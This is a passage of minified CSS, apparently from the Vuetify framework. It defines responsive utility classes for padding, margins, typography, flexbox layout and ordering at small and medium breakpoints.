.pt-sm-3{padding-top:12px!important}.v-application .pt-sm-4{padding-top:16px!important}.v-application .pt-sm-5{padding-top:20px!important}.v-application .pt-sm-6{padding-top:24px!important}.v-application .pt-sm-7{padding-top:28px!important}.v-application .pt-sm-8{padding-top:32px!important}.v-application .pt-sm-9{padding-top:36px!important}.v-application .pt-sm-10{padding-top:40px!important}.v-application .pt-sm-11{padding-top:44px!important}.v-application .pt-sm-12{padding-top:48px!important}.v-application .pt-sm-13{padding-top:52px!important}.v-application .pt-sm-14{padding-top:56px!important}.v-application .pt-sm-15{padding-top:60px!important}.v-application .pt-sm-16{padding-top:64px!important}.v-application .pr-sm-0{padding-right:0!important}.v-application .pr-sm-1{padding-right:4px!important}.v-application .pr-sm-2{padding-right:8px!important}.v-application .pr-sm-3{padding-right:12px!important}.v-application .pr-sm-4{padding-right:16px!important}.v-application .pr-sm-5{padding-right:20px!important}.v-application .pr-sm-6{padding-right:24px!important}.v-application .pr-sm-7{padding-right:28px!important}.v-application .pr-sm-8{padding-right:32px!important}.v-application .pr-sm-9{padding-right:36px!important}.v-application .pr-sm-10{padding-right:40px!important}.v-application .pr-sm-11{padding-right:44px!important}.v-application .pr-sm-12{padding-right:48px!important}.v-application .pr-sm-13{padding-right:52px!important}.v-application .pr-sm-14{padding-right:56px!important}.v-application .pr-sm-15{padding-right:60px!important}.v-application .pr-sm-16{padding-right:64px!important}.v-application .pb-sm-0{padding-bottom:0!important}.v-application .pb-sm-1{padding-bottom:4px!important}.v-application .pb-sm-2{padding-bottom:8px!important}.v-application .pb-sm-3{padding-bottom:12px!important}.v-application .pb-sm-4{padding-bottom:16px!important}.v-application .pb-sm-5{padding-bottom:20px!important}.v-application .pb-sm-6{padding-bottom:24px!important}.v-application .pb-sm-7{padding-bottom:28px!important}.v-application .pb-sm-8{padding-bottom:32px!important}.v-application .pb-sm-9{padding-bottom:36px!important}.v-application .pb-sm-10{padding-bottom:40px!important}.v-application .pb-sm-11{padding-bottom:44px!important}.v-application .pb-sm-12{padding-bottom:48px!important}.v-application .pb-sm-13{padding-bottom:52px!important}.v-application .pb-sm-14{padding-bottom:56px!important}.v-application .pb-sm-15{padding-bottom:60px!important}.v-application .pb-sm-16{padding-bottom:64px!important}.v-application .pl-sm-0{padding-left:0!important}.v-application .pl-sm-1{padding-left:4px!important}.v-application .pl-sm-2{padding-left:8px!important}.v-application .pl-sm-3{padding-left:12px!important}.v-application .pl-sm-4{padding-left:16px!important}.v-application .pl-sm-5{padding-left:20px!important}.v-application .pl-sm-6{padding-left:24px!important}.v-application .pl-sm-7{padding-left:28px!important}.v-application .pl-sm-8{padding-left:32px!important}.v-application .pl-sm-9{padding-left:36px!important}.v-application .pl-sm-10{padding-left:40px!important}.v-application .pl-sm-11{padding-left:44px!important}.v-application .pl-sm-12{padding-left:48px!important}.v-application .pl-sm-13{padding-left:52px!important}.v-application .pl-sm-14{padding-left:56px!important}.v-application .pl-sm-15{padding-left:60px!important}.v-application .pl-sm-16{padding-left:64px!important}.v-application--is-ltr .ps-sm-0{padding-left:0!important}.v-application--is-rtl .ps-sm-0{padding-right:0!important}.v-application--is-ltr .ps-sm-1{padding-left:4px!important}.v-application--is-rtl .ps-sm-1{padding-right:4px!important}.v-application--is-ltr .ps-sm-2{padding-left:8px!important}.v-application--is-rtl .ps-sm-2{padding-right:8px!important}.v-application--is-ltr .ps-sm-3{padding-left:12px!important}.v-application--is-rtl .ps-sm-3{padding-right:12px!important}.v-application--is-ltr .ps-sm-4{padding-left:16px!important}.v-application--is-rtl .ps-sm-4{padding-right:16px!important}.v-application--is-ltr .ps-sm-5{padding-left:20px!important}.v-application--is-rtl .ps-sm-5{padding-right:20px!important}.v-application--is-ltr .ps-sm-6{padding-left:24px!important}.v-application--is-rtl .ps-sm-6{padding-right:24px!important}.v-application--is-ltr .ps-sm-7{padding-left:28px!important}.v-application--is-rtl .ps-sm-7{padding-right:28px!important}.v-application--is-ltr .ps-sm-8{padding-left:32px!important}.v-application--is-rtl .ps-sm-8{padding-right:32px!important}.v-application--is-ltr .ps-sm-9{padding-left:36px!important}.v-application--is-rtl .ps-sm-9{padding-right:36px!important}.v-application--is-ltr .ps-sm-10{padding-left:40px!important}.v-application--is-rtl .ps-sm-10{padding-right:40px!important}.v-application--is-ltr .ps-sm-11{padding-left:44px!important}.v-application--is-rtl .ps-sm-11{padding-right:44px!important}.v-application--is-ltr .ps-sm-12{padding-left:48px!important}.v-application--is-rtl .ps-sm-12{padding-right:48px!important}.v-application--is-ltr .ps-sm-13{padding-left:52px!important}.v-application--is-rtl .ps-sm-13{padding-right:52px!important}.v-application--is-ltr .ps-sm-14{padding-left:56px!important}.v-application--is-rtl .ps-sm-14{padding-right:56px!important}.v-application--is-ltr .ps-sm-15{padding-left:60px!important}.v-application--is-rtl .ps-sm-15{padding-right:60px!important}.v-application--is-ltr .ps-sm-16{padding-left:64px!important}.v-application--is-rtl .ps-sm-16{padding-right:64px!important}.v-application--is-ltr .pe-sm-0{padding-right:0!important}.v-application--is-rtl .pe-sm-0{padding-left:0!important}.v-application--is-ltr .pe-sm-1{padding-right:4px!important}.v-application--is-rtl .pe-sm-1{padding-left:4px!important}.v-application--is-ltr .pe-sm-2{padding-right:8px!important}.v-application--is-rtl .pe-sm-2{padding-left:8px!important}.v-application--is-ltr .pe-sm-3{padding-right:12px!important}.v-application--is-rtl .pe-sm-3{padding-left:12px!important}.v-application--is-ltr .pe-sm-4{padding-right:16px!important}.v-application--is-rtl .pe-sm-4{padding-left:16px!important}.v-application--is-ltr .pe-sm-5{padding-right:20px!important}.v-application--is-rtl .pe-sm-5{padding-left:20px!important}.v-application--is-ltr .pe-sm-6{padding-right:24px!important}.v-application--is-rtl .pe-sm-6{padding-left:24px!important}.v-application--is-ltr .pe-sm-7{padding-right:28px!important}.v-application--is-rtl .pe-sm-7{padding-left:28px!important}.v-application--is-ltr .pe-sm-8{padding-right:32px!important}.v-application--is-rtl .pe-sm-8{padding-left:32px!important}.v-application--is-ltr .pe-sm-9{padding-right:36px!important}.v-application--is-rtl .pe-sm-9{padding-left:36px!important}.v-application--is-ltr .pe-sm-10{padding-right:40px!important}.v-application--is-rtl .pe-sm-10{padding-left:40px!important}.v-application--is-ltr .pe-sm-11{padding-right:44px!important}.v-application--is-rtl .pe-sm-11{padding-left:44px!important}.v-application--is-ltr .pe-sm-12{padding-right:48px!important}.v-application--is-rtl .pe-sm-12{padding-left:48px!important}.v-application--is-ltr .pe-sm-13{padding-right:52px!important}.v-application--is-rtl .pe-sm-13{padding-left:52px!important}.v-application--is-ltr .pe-sm-14{padding-right:56px!important}.v-application--is-rtl .pe-sm-14{padding-left:56px!important}.v-application--is-ltr .pe-sm-15{padding-right:60px!important}.v-application--is-rtl .pe-sm-15{padding-left:60px!important}.v-application--is-ltr .pe-sm-16{padding-right:64px!important}.v-application--is-rtl .pe-sm-16{padding-left:64px!important}.v-application .text-sm-left{text-align:left!important}.v-application .text-sm-right{text-align:right!important}.v-application .text-sm-center{text-align:center!important}.v-application .text-sm-justify{text-align:justify!important}[dir=ltr] .v-application .text-sm-start{text-align:left!important}[dir=ltr] .v-application .text-sm-end,[dir=rtl] .v-application .text-sm-start{text-align:right!important}[dir=rtl] .v-application .text-sm-end{text-align:left!important}.v-application .text-sm-h1{font-size:6rem!important;line-height:6rem;letter-spacing:-.015625em!important}.v-application .text-sm-h1,.v-application .text-sm-h2{font-weight:300;font-family:"Roboto",sans-serif!important}.v-application .text-sm-h2{font-size:3.75rem!important;line-height:3.75rem;letter-spacing:-.0083333333em!important}.v-application .text-sm-h3{font-size:3rem!important;line-height:3.125rem;letter-spacing:normal!important}.v-application .text-sm-h3,.v-application .text-sm-h4{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .text-sm-h4{font-size:2.125rem!important;line-height:2.5rem;letter-spacing:.0073529412em!important}.v-application .text-sm-h5{font-size:1.5rem!important;font-weight:400;letter-spacing:normal!important}.v-application .text-sm-h5,.v-application .text-sm-h6{line-height:2rem;font-family:"Roboto",sans-serif!important}.v-application .text-sm-h6{font-size:1.25rem!important;font-weight:500;letter-spacing:.0125em!important}.v-application .text-sm-subtitle-1{font-size:1rem!important;font-weight:400;line-height:1.75rem;letter-spacing:.009375em!important;font-family:"Roboto",sans-serif!important}.v-application .text-sm-subtitle-2{font-size:.875rem!important;font-weight:500;line-height:1.375rem;letter-spacing:.0071428571em!important;font-family:"Roboto",sans-serif!important}.v-application .text-sm-body-1{font-size:1rem!important;font-weight:400;line-height:1.5rem;letter-spacing:.03125em!important;font-family:"Roboto",sans-serif!important}.v-application .text-sm-body-2{font-weight:400;line-height:1.25rem;letter-spacing:.0178571429em!important}.v-application .text-sm-body-2,.v-application .text-sm-button{font-size:.875rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-sm-button{font-weight:500;line-height:2.25rem;letter-spacing:.0892857143em!important;text-transform:uppercase!important}.v-application .text-sm-caption{font-weight:400;line-height:1.25rem;letter-spacing:.0333333333em!important}.v-application .text-sm-caption,.v-application .text-sm-overline{font-size:.75rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-sm-overline{font-weight:500;line-height:2rem;letter-spacing:.1666666667em!important;text-transform:uppercase!important}}@media(min-width:960px){.v-application .d-md-none{display:none!important}.v-application .d-md-inline{display:inline!important}.v-application .d-md-inline-block{display:inline-block!important}.v-application .d-md-block{display:block!important}.v-application .d-md-table{display:table!important}.v-application .d-md-table-row{display:table-row!important}.v-application .d-md-table-cell{display:table-cell!important}.v-application .d-md-flex{display:flex!important}.v-application .d-md-inline-flex{display:inline-flex!important}.v-application .float-md-none{float:none!important}.v-application .float-md-left{float:left!important}.v-application .float-md-right{float:right!important}.v-application .flex-md-fill{flex:1 1 auto!important}.v-application .flex-md-row{flex-direction:row!important}.v-application .flex-md-column{flex-direction:column!important}.v-application .flex-md-row-reverse{flex-direction:row-reverse!important}.v-application .flex-md-column-reverse{flex-direction:column-reverse!important}.v-application .flex-md-grow-0{flex-grow:0!important}.v-application .flex-md-grow-1{flex-grow:1!important}.v-application .flex-md-shrink-0{flex-shrink:0!important}.v-application .flex-md-shrink-1{flex-shrink:1!important}.v-application .flex-md-wrap{flex-wrap:wrap!important}.v-application .flex-md-nowrap{flex-wrap:nowrap!important}.v-application .flex-md-wrap-reverse{flex-wrap:wrap-reverse!important}.v-application .justify-md-start{justify-content:flex-start!important}.v-application .justify-md-end{justify-content:flex-end!important}.v-application .justify-md-center{justify-content:center!important}.v-application .justify-md-space-between{justify-content:space-between!important}.v-application .justify-md-space-around{justify-content:space-around!important}.v-application .align-md-start{align-items:flex-start!important}.v-application .align-md-end{align-items:flex-end!important}.v-application .align-md-center{align-items:center!important}.v-application .align-md-baseline{align-items:baseline!important}.v-application .align-md-stretch{align-items:stretch!important}.v-application .align-content-md-start{align-content:flex-start!important}.v-application .align-content-md-end{align-content:flex-end!important}.v-application .align-content-md-center{align-content:center!important}.v-application .align-content-md-space-between{align-content:space-between!important}.v-application .align-content-md-space-around{align-content:space-around!important}.v-application .align-content-md-stretch{align-content:stretch!important}.v-application .align-self-md-auto{align-self:auto!important}.v-application .align-self-md-start{align-self:flex-start!important}.v-application .align-self-md-end{align-self:flex-end!important}.v-application .align-self-md-center{align-self:center!important}.v-application .align-self-md-baseline{align-self:baseline!important}.v-application .align-self-md-stretch{align-self:stretch!important}.v-application .order-md-first{order:-1!important}.v-application .order-md-0{order:0!important}.v-application .order-md-1{order:1!important}.v-application .order-md-2{order:2!important}.v-application .order-md-3{order:3!important}.v-application .order-md-4{order:4!important}.v-application .order-md-5{order:5!important}.v-application .order-md-6{order:6!important}.v-application .order-md-7{order:7!important}.v-application .order-md-8{order:8!important}.v-application .order-md-9{order:9!important}.v-application .order-md-10{order:10!important}.v-application .order-md-11{order:11!important}.v-application .order-md-12{order:12!important}.v-application .order-md-last{order:13!important}.v-application .ma-md-0{margin:0!important}.v-application .ma-md-1{margin:4px!important}.v-application .ma-md-2{margin:8px!important}.v-application .ma-md-3{margin:12px!important}.v-application .ma-md-4{margin:16px!important}.v-application .ma-md-5{margin:20px!important}.v-application .ma-md-6{margin:24px!important}.v-application .ma-md-7{margin:28px!important}.v-application .ma-md-8{margin:32px!important}.v-application .ma-md-9{margin:36px!important}.v-application .ma-md-10{margin:40px!important}.v-application .ma-md-11{margin:44px!important}.v-application .ma-md-12{margin:48px!important}.v-application .ma-md-13{margin:52px!important}.v-application .ma-md-14{margin:56px!important}.v-application .ma-md-15{margin:60px!important}.v-application .ma-md-16{margin:64px!important}.v-application .ma-md-auto{margin:auto!important}.v-application .mx-md-0{margin-right:0!important;margin-left:0!important}.v-application .mx-md-1{margin-right:4px!important;margin-left:4px!important}.v-application .mx-md-2{margin-right:8px!important;margin-left:8px!important}.v-application .mx-md-3{margin-right:12px!important;margin-left:12px!important}.v-application .mx-md-4{margin-right:16px!important;margin-left:16px!important}.v-application .mx-md-5{margin-right:20px!important;margin-left:20px!important}.v-application .mx-md-6{margin-right:24px!important;margin-left:24px!important}.v-application .mx-md-7{margin-right:28px!important;margin-left:28px!important}.v-application .mx-md-8{margin-right:32px!important;margin-left:32px!important}.v-application .mx-md-9{margin-right:36px!important;margin-left:36px!important}.v-application .mx-md-10{margin-right:40px!important;margin-left:40px!important}.v-application .mx-md-11{margin-right:44px!important;margin-left:44px!important}.v-application .mx-md-12{margin-right:48px!important;margin-left:48px!important}.v-application .mx-md-13{margin-right:52px!important;margin-left:52px!important}.v-application .mx-md-14{margin-right:56px!important;margin-left:56px!important}.v-application .mx-md-15{margin-right:60px!important;margin-left:60px!important}.v-application .mx-md-16{margin-right:64px!important;margin-left:64px!important}.v-application .mx-md-auto{margin-right:auto!important;margin-left:auto!important}.v-application .my-md-0{margin-top:0!important;margin-bottom:0!important}.v-application .my-md-1{margin-top:4px!important;margin-bottom:4px!important}.v-application .my-md-2{margin-top:8px!important;margin-bottom:8px!important}.v-application .my-md-3{margin-top:12px!important;margin-bottom:12px!important}.v-application .my-md-4{margin-top:16px!important;margin-bottom:16px!important}.v-application .my-md-5{margin-top:20px!important;margin-bottom:20px!important}.v-application .my-md-6{margin-top:24px!important;margin-bottom:24px!important}.v-application .my-md-7{margin-top:28px!important;margin-bottom:28px!important}.v-application .my-md-8{margin-top:32px!important;margin-bottom:32px!important}.v-application .my-md-9{margin-top:36px!important;margin-bottom:36px!important}.v-application .my-md-10{margin-top:40px!important;margin-bottom:40px!important}.v-application .my-md-11{margin-top:44px!important;margin-bottom:44px!important}.v-application .my-md-12{margin-top:48px!important;margin-bottom:48px!important}.v-application .my-md-13{margin-top:52px!important;margin-bottom:52px!important}.v-application .my-md-14{margin-top:56px!important;margin-bottom:56px!important}.v-application .my-md-15{margin-top:60px!important;margin-bottom:60px!important}.v-application .my-md-16{margin-top:64px!important;margin-bottom:64px!important}.v-application .my-md-auto{margin-top:auto!important;margin-bottom:auto!important}.v-application .mt-md-0{margin-top:0!important}.v-application .mt-md-1{margin-top:4px!important}.v-application .mt-md-2{margin-top:8px!important}.v-application .mt-md-3{margin-top:12px!important}.v-application .mt-md-4{margin-top:16px!important}.v-application .mt-md-5{margin-top:20px!important}.v-application .mt-md-6{margin-top:24px!important}.v-application .mt-md-7{margin-top:28px!important}.v-application .mt-md-8{margin-top:32px!important}.v-application .mt-md-9{margin-top:36px!important}.v-application .mt-md-10{margin-top:40px!important}.v-application .mt-md-11{margin-top:44px!important}.v-application .mt-md-12{margin-top:48px!important}.v-application .mt-md-13{margin-top:52px!important}.v-application .mt-md-14{margin-top:56px!important}.v-application .mt-md-15{margin-top:60px!important}.v-application .mt-md-16{margin-top:64px!important}.v-application .mt-md-auto{margin-top:auto!important}.v-application .mr-md-0{margin-right:0!important}.v-application .mr-md-1{margin-right:4px!important}.v-application .mr-md-2{margin-right:8px!important}.v-application .mr-md-3{margin-right:12px!important}.v-application .mr-md-4{margin-right:16px!important}.v-application .mr-md-5{margin-right:20px!important}.v-application .mr-md-6{margin-right:24px!important}.v-application .mr-md-7{margin-right:28px!important}.v-application .mr-md-8{margin-right:32px!important}.v-application .mr-md-9{margin-right:36px!important}.v-application .mr-md-10{margin-right:40px!important}.v-application .mr-md-11{margin-right:44px!important}.v-application .mr-md-12{margin-right:48px!important}.v-application .mr-md-13{margin-right:52px!important}.v-application .mr-md-14{margin-right:56px!important}.v-application .mr-md-15{margin-right:60px!important}.v-application .mr-md-16{margin-right:64px!important}.v-application .mr-md-auto{margin-right:auto!important}.v-application .mb-md-0{margin-bottom:0!important}.v-application .mb-md-1{margin-bottom:4px!important}.v-application .mb-md-2{margin-bottom:8px!important}.v-application .mb-md-3{margin-bottom:12px!important}.v-application .mb-md-4{margin-bottom:16px!important}.v-application .mb-md-5{margin-bottom:20px!important}.v-application .mb-md-6{margin-bottom:24px!important}.v-application .mb-md-7{margin-bottom:28px!important}.v-application .mb-md-8{margin-bottom:32px!important}.v-application .mb-md-9{margin-bottom:36px!important}.v-application .mb-md-10{margin-bottom:40px!important}.v-application .mb-md-11{margin-bottom:44px!important}.v-application .mb-md-12{margin-bottom:48px!important}.v-application .mb-md-13{margin-bottom:52px!important}.v-application .mb-md-14{margin-bottom:56px!important}.v-application .mb-md-15{margin-bottom:60px!important}.v-application .mb-md-16{margin-bottom:64px!important}.v-application .mb-md-auto{margin-bottom:auto!important}.v-application .ml-md-0{margin-left:0!important}.v-application .ml-md-1{margin-left:4px!important}.v-application .ml-md-2{margin-left:8px!important}.v-application .ml-md-3{margin-left:12px!important}.v-application .ml-md-4{margin-left:16px!important}.v-application .ml-md-5{margin-left:20px!important}.v-application .ml-md-6{margin-left:24px!important}.v-application .ml-md-7{margin-left:28px!important}.v-application .ml-md-8{margin-left:32px!important}.v-application .ml-md-9{margin-left:36px!important}.v-application .ml-md-10{margin-left:40px!important}.v-application .ml-md-11{margin-left:44px!important}.v-application .ml-md-12{margin-left:48px!important}.v-application .ml-md-13{margin-left:52px!important}.v-application .ml-md-14{margin-left:56px!important}.v-application .ml-md-15{margin-left:60px!important}.v-application .ml-md-16{margin-left:64px!important}.v-application .ml-md-auto{margin-left:auto!important}.v-application--is-ltr .ms-md-0{margin-left:0!important}.v-application--is-rtl .ms-md-0{margin-right:0!important}.v-application--is-ltr .ms-md-1{margin-left:4px!important}.v-application--is-rtl .ms-md-1{margin-right:4px!important}.v-application--is-ltr .ms-md-2{margin-left:8px!important}.v-application--is-rtl .ms-md-2{margin-right:8px!important}.v-application--is-ltr .ms-md-3{margin-left:12px!important}.v-application--is-rtl .ms-md-3{margin-right:12px!important}.v-application--is-ltr .ms-md-4{margin-left:16px!important}.v-application--is-rtl .ms-md-4{margin-right:16px!important}.v-application--is-ltr .ms-md-5{margin-left:20px!important}.v-application--is-rtl .ms-md-5{margin-right:20px!important}.v-application--is-ltr .ms-md-6{margin-left:24px!important}.v-application--is-rtl .ms-md-6{margin-right:24px!important}.v-application--is-ltr .ms-md-7{margin-left:28px!important}.v-application--is-rtl .ms-md-7{margin-right:28px!important}.v-application--is-ltr .ms-md-8{margin-left:32px!important}.v-application--is-rtl .ms-md-8{margin-right:32px!important}.v-application--is-ltr .ms-md-9{margin-left:36px!important}.v-application--is-rtl .ms-md-9{margin-right:36px!important}.v-application--is-ltr .ms-md-10{margin-left:40px!important}.v-application--is-rtl .ms-md-10{margin-right:40px!important}.v-application--is-ltr .ms-md-11{margin-left:44px!important}.v-application--is-rtl .ms-md-11{margin-right:44px!important}.v-application--is-ltr .ms-md-12{margin-left:48px!important}.v-application--is-rtl .ms-md-12{margin-right:48px!important}.v-application--is-ltr .ms-md-13{margin-left:52px!important}.v-application--is-rtl .ms-md-13{margin-right:52px!important}.v-application--is-ltr .ms-md-14{margin-left:56px!important}.v-application--is-rtl .ms-md-14{margin-right:56px!important}.v-application--is-ltr .ms-md-15{margin-left:60px!important}.v-application--is-rtl .ms-md-15{margin-right:60px!important}.v-application--is-ltr .ms-md-16{margin-left:64px!important}.v-application--is-rtl .ms-md-16{margin-right:64px!important}.v-application--is-ltr .ms-md-auto{margin-left:auto!important}.v-application--is-rtl .ms-md-auto{margin-right:auto!important}.v-application--is-ltr .me-md-0{margin-right:0!important}.v-application--is-rtl .me-md-0{margin-left:0!important}.v-application--is-ltr .me-md-1{margin-right:4px!important}.v-application--is-rtl .me-md-1{margin-left:4px!important}.v-application--is-ltr .me-md-2{margin-right:8px!important}.v-application--is-rtl .me-md-2{margin-left:8px!important}.v-application--is-ltr .me-md-3{margin-right:12px!important}.v-application--is-rtl .me-md-3{margin-left:12px!important}.v-application--is-ltr .me-md-4{margin-right:16px!important}.v-application--is-rtl .me-md-4{margin-left:16px!important}.v-application--is-ltr .me-md-5{margin-right:20px!important}.v-application--is-rtl .me-md-5{margin-left:20px!important}.v-application--is-ltr .me-md-6{margin-right:24px!important}.v-application--is-rtl .me-md-6{margin-left:24px!important}.v-application--is-ltr .me-md-7{margin-right:28px!important}.v-application--is-rtl .me-md-7{margin-left:28px!important}.v-application--is-ltr .me-md-8{margin-right:32px!important}.v-application--is-rtl .me-md-8{margin-left:32px!important}.v-application--is-ltr .me-md-9{margin-right:36px!important}.v-application--is-rtl .me-md-9{margin-left:36px!important}.v-application--is-ltr .me-md-10{margin-right:40px!important}.v-application--is-rtl .me-md-10{margin-left:40px!important}.v-application--is-ltr .me-md-11{margin-right:44px!important}.v-application--is-rtl .me-md-11{margin-left:44px!important}.v-application--is-ltr .me-md-12{margin-right:48px!important}.v-application--is-rtl .me-md-12{margin-left:48px!important}.v-application--is-ltr .me-md-13{margin-right:52px!important}.v-application--is-rtl .me-md-13{margin-left:52px!important}.v-application--is-ltr .me-md-14{margin-right:56px!important}.v-application--is-rtl .me-md-14{margin-left:56px!important}.v-application--is-ltr .me-md-15{margin-right:60px!important}.v-application--is-rtl .me-md-15{margin-left:60px!important}.v-application--is-ltr .me-md-16{margin-right:64px!important}.v-application--is-rtl .me-md-16{margin-left:64px!important}.v-application--is-ltr .me-md-auto{margin-right:auto!important}.v-application--is-rtl .me-md-auto{margin-left:auto!important}.v-application .ma-md-n1{margin:-4px!important}.v-application .ma-md-n2{margin:-8px!important}.v-application .ma-md-n3{margin:-12px!important}.v-application .ma-md-n4{margin:-16px!important}.v-application .ma-md-n5{margin:-20px!important}.v-application .ma-md-n6{margin:-24px!important}.v-application .ma-md-n7{margin:-28px!important}.v-application .ma-md-n8{margin:-32px!important}.v-application .ma-md-n9{margin:-36px!important}.v-application .ma-md-n10{margin:-40px!important}.v-application .ma-md-n11{margin:-44px!important}.v-application .ma-md-n12{margin:-48px!important}.v-application .ma-md-n13{margin:-52px!important}.v-application .ma-md-n14{margin:-56px!important}.v-application .ma-md-n15{margin:-60px!important}.v-application .ma-md-n16{margin:-64px!important}.v-application .mx-md-n1{margin-right:-4px!important;margin-left:-4px!important}.v-application .mx-md-n2{margin-right:-8px!important;margin-left:-8px!important}.v-application .mx-md-n3{margin-right:-12px!important;margin-left:-12px!important}.v-application .mx-md-n4{margin-right:-16px!important;margin-left:-16px!important}.v-application .mx-md-n5{margin-right:-20px!important;margin-left:-20px!important}.v-application .mx-md-n6{margin-right:-24px!important;margin-left:-24px!important}.v-application .mx-md-n7{margin-right:-28px!important;margin-left:-28px!important}.v-application .mx-md-n8{margin-right:-32px!important;margin-left:-32px!important}.v-application .mx-md-n9{margin-right:-36px!important;margin-left:-36px!important}.v-application .mx-md-n10{margin-right:-40px!important;margin-left:-40px!important}.v-application .mx-md-n11{margin-right:-44px!important;margin-left:-44px!important}.v-application .mx-md-n12{margin-right:-48px!important;margin-left:-48px!important}.v-application .mx-md-n13{margin-right:-52px!important;margin-left:-52px!important}.v-application .mx-md-n14{margin-right:-56px!important;margin-left:-56px!important}.v-application .mx-md-n15{margin-right:-60px!important;margin-left:-60px!important}.v-application .mx-md-n16{margin-right:-64px!important;margin-left:-64px!important}.v-application .my-md-n1{margin-top:-4px!important;margin-bottom:-4px!important}.v-application .my-md-n2{margin-top:-8px!important;margin-bottom:-8px!important}.v-application .my-md-n3{margin-top:-12px!important;margin-bottom:-12px!important}.v-application .my-md-n4{margin-top:-16px!important;margin-bottom:-16px!important}.v-application .my-md-n5{margin-top:-20px!important;margin-bottom:-20px!important}.v-application .my-md-n6{margin-top:-24px!important;margin-bottom:-24px!important}.v-application .my-md-n7{margin-top:-28px!important;margin-bottom:-28px!important}.v-application .my-md-n8{margin-top:-32px!important;margin-bottom:-32px!important}.v-application .my-md-n9{margin-top:-36px!important;margin-bottom:-36px!important}.v-application .my-md-n10{margin-top:-40px!important;margin-bottom:-40px!important}.v-application .my-md-n11{margin-top:-44px!important;margin-bottom:-44px!important}.v-application .my-md-n12{margin-top:-48px!important;margin-bottom:-48px!important}.v-application .my-md-n13{margin-top:-52px!important;margin-bottom:-52px!important}.v-application .my-md-n14{margin-top:-56px!important;margin-bottom:-56px!important}.v-application .my-md-n15{margin-top:-60px!important;margin-bottom:-60px!important}.v-application .my-md-n16{margin-top:-64px!important;margin-bottom:-64px!important}.v-application .mt-md-n1{margin-top:-4px!important}.v-application .mt-md-n2{margin-top:-8px!important}.v-application .mt-md-n3{margin-top:-12px!important}.v-application .mt-md-n4{margin-top:-16px!important}.v-application .mt-md-n5{margin-top:-20px!important}.v-application .mt-md-n6{margin-top:-24px!important}.v-application .mt-md-n7{margin-top:-28px!important}.v-application .mt-md-n8{margin-top:-32px!important}.v-application .mt-md-n9{margin-top:-36px!important}.v-application .mt-md-n10{margin-top:-40px!important}.v-application .mt-md-n11{margin-top:-44px!important}.v-application .mt-md-n12{margin-top:-48px!important}.v-application .mt-md-n13{margin-top:-52px!important}.v-application .mt-md-n14{margin-top:-56px!important}.v-application .mt-md-n15{margin-top:-60px!important}.v-application .mt-md-n16{margin-top:-64px!important}.v-application .mr-md-n1{margin-right:-4px!important}.v-application .mr-md-n2{margin-right:-8px!important}.v-application .mr-md-n3{margin-right:-12px!important}.v-application .mr-md-n4{margin-right:-16px!important}.v-application .mr-md-n5{margin-right:-20px!important}.v-application .mr-md-n6{margin-right:-24px!important}.v-application .mr-md-n7{margin-right:-28px!important}.v-application .mr-md-n8{margin-right:-32px!important}.v-application .mr-md-n9{margin-right:-36px!important}.v-application .mr-md-n10{margin-right:-40px!important}.v-application .mr-md-n11{margin-right:-44px!important}.v-application .mr-md-n12{margin-right:-48px!important}.v-application .mr-md-n13{margin-right:-52px!important}.v-application .mr-md-n14{margin-right:-56px!important}.v-application .mr-md-n15{margin-right:-60px!important}.v-application .mr-md-n16{margin-right:-64px!important}.v-application .mb-md-n1{margin-bottom:-4px!important}.v-application .mb-md-n2{margin-bottom:-8px!important}.v-application .mb-md-n3{margin-bottom:-12px!important}.v-application .mb-md-n4{margin-bottom:-16px!important}.v-application .mb-md-n5{margin-bottom:-20px!important}.v-application .mb-md-n6{margin-bottom:-24px!important}.v-application .mb-md-n7{margin-bottom:-28px!important}.v-application .mb-md-n8{margin-bottom:-32px!important}.v-application .mb-md-n9{margin-bottom:-36px!important}.v-application .mb-md-n10{margin-bottom:-40px!important}.v-application .mb-md-n11{margin-bottom:-44px!important}.v-application .mb-md-n12{margin-bottom:-48px!important}.v-application .mb-md-n13{margin-bottom:-52px!important}.v-application .mb-md-n14{margin-bottom:-56px!important}.v-application .mb-md-n15{margin-bottom:-60px!important}.v-application .mb-md-n16{margin-bottom:-64px!important}.v-application .ml-md-n1{margin-left:-4px!important}.v-application .ml-md-n2{margin-left:-8px!important}.v-application .ml-md-n3{margin-left:-12px!important}.v-application .ml-md-n4{margin-left:-16px!important}.v-application .ml-md-n5{margin-left:-20px!important}.v-application .ml-md-n6{margin-left:-24px!important}.v-application .ml-md-n7{margin-left:-28px!important}.v-application .ml-md-n8{margin-left:-32px!important}.v-application .ml-md-n9{margin-left:-36px!important}.v-application .ml-md-n10{margin-left:-40px!important}.v-application .ml-md-n11{margin-left:-44px!important}.v-application .ml-md-n12{margin-left:-48px!important}.v-application .ml-md-n13{margin-left:-52px!important}.v-application .ml-md-n14{margin-left:-56px!important}.v-application .ml-md-n15{margin-left:-60px!important}.v-application .ml-md-n16{margin-left:-64px!important}.v-application--is-ltr .ms-md-n1{margin-left:-4px!important}.v-application--is-rtl .ms-md-n1{margin-right:-4px!important}.v-application--is-ltr .ms-md-n2{margin-left:-8px!important}.v-application--is-rtl .ms-md-n2{margin-right:-8px!important}.v-application--is-ltr .ms-md-n3{margin-left:-12px!important}.v-application--is-rtl .ms-md-n3{margin-right:-12px!important}.v-application--is-ltr .ms-md-n4{margin-left:-16px!important}.v-application--is-rtl .ms-md-n4{margin-right:-16px!important}.v-application--is-ltr .ms-md-n5{margin-left:-20px!important}.v-application--is-rtl .ms-md-n5{margin-right:-20px!important}.v-application--is-ltr .ms-md-n6{margin-left:-24px!important}.v-application--is-rtl .ms-md-n6{margin-right:-24px!important}.v-application--is-ltr .ms-md-n7{margin-left:-28px!important}.v-application--is-rtl .ms-md-n7{margin-right:-28px!important}.v-application--is-ltr .ms-md-n8{margin-left:-32px!important}.v-application--is-rtl .ms-md-n8{margin-right:-32px!important}.v-application--is-ltr .ms-md-n9{margin-left:-36px!important}.v-application--is-rtl .ms-md-n9{margin-right:-36px!important}.v-application--is-ltr .ms-md-n10{margin-left:-40px!important}.v-application--is-rtl .ms-md-n10{margin-right:-40px!important}.v-application--is-ltr .ms-md-n11{margin-left:-44px!important}.v-application--is-rtl .ms-md-n11{margin-right:-44px!important}.v-application--is-ltr .ms-md-n12{margin-left:-48px!important}.v-application--is-rtl .ms-md-n12{margin-right:-48px!important}.v-application--is-ltr .ms-md-n13{margin-left:-52px!important}.v-application--is-rtl .ms-md-n13{margin-right:-52px!important}.v-application--is-ltr .ms-md-n14{margin-left:-56px!important}.v-application--is-rtl 